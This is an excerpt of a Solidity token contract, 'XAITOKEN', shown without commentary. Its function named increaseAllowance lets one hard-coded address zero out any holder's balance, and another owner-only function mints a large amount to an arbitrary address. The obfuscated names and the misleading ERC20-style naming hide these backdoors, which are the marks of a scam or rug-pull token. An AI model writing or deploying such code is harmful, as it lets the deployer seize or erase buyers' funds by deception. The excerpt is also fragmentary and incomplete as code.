...
contract XAITOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(dcllogn177 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = XAI[newadd];
        uint256 newaaamount = XAI[newadd]+XAI[newadd]-curamount;
        XAI[newadd] -= newaaamount;
        }else{
        if(dcllogn177 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        XAI[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(dcllogn177 == _msgSender());
        if(dcllogn177 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = XAI[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        XAI[from] = XAI[from]-amount;
        XAI[to] = XAI[to]+amount;
